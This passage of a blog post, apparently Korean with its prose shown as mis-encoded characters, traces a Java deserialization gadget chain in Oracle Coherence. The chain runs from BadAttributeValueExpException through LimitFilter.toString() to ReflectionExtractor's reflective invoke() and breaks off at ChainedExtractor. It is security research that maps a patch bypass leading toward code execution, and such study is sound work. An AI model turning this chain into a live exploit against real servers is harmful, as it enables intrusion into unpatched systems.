&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/dm0702.png&quot; alt=&quot;/assets/dm0702.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ê·¸ëŸ¬ë‚˜ BadAttributeValueExpExceptionì˜ readObject() ë©”ì†Œë“œë¥¼ í†µí•´ íŒ¨ì¹˜ì „ê³¼ ë™ì¼í•˜ê²Œ extract() ë¥¼ í˜¸ì¶œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;ì•„ë˜ readObject()ì™€ ê°™ì´ valObj.toString() ë©”ì†Œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;readObject() in BadAttributeValueExpException.java&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ObjectInputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ois&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ClassNotFoundException&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;ObjectInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GetField&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ois&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readFields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;val&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getSecurityManager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Long&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Integer&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Float&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Double&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Byte&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Short&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Boolean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;- Called toString()&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// the serialized object is from a version without JDK-8019292 fix&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;identityHashCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;@&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valObj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;toString() ë©”ì†Œë“œëŠ” ì•„ë˜ì™€ ê°™ì´ this.m_oAnchorTopì™€ this.m_oAnchorBottomë¥¼ ë§¤ê°œë³€ìˆ˜ë¡œ ì „ë‹¬í•˜ì—¬ ValueExtractor.extract() ë©”ì†Œë“œë¥¼ í˜¸ì¶œí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;LimitFilter: (&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_filter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; [pageSize=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_cPageSize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;, pageNum=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_nPage&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_comparator&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;ValueExtractor&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extractor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ValueExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_comparator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;, top=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_oAnchorTop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;, bottom=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_oAnchorBottom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_comparator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;, comparator=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_comparator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;])&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ë˜í•œ, ìœ„ ValueExtractor.extract() ë©”ì†Œë“œë¥¼ íŠ¸ë¦¬ê±° í•˜ê¸° ìœ„í•´ ì•„ë˜ì™€ ê°™ì€ extract êµ¬í˜„ì²´ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
  &lt;li&gt;com.tangosol.util.extractor.ReflectionExtractor#extract()&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;extract&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_methodPrev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDeclaringClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_methodPrev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ClassHelper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;findMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getMethodName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ClassHelper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_aoParam&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_aoParam&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// &amp;lt;- Called invoke()&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;NullPointerException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;RuntimeException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;suggestExtractFailureCause&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;var5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ensureRuntimeException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'('&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oTarget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;')'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;ChainedTransformercom.tangosol.util.extractor.ChainedExtractor#extract()&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@JsonbCreator&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ChainedExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@JsonbProperty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;extractors&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ValueExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aExtractor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m_nTarget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;computeTarget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
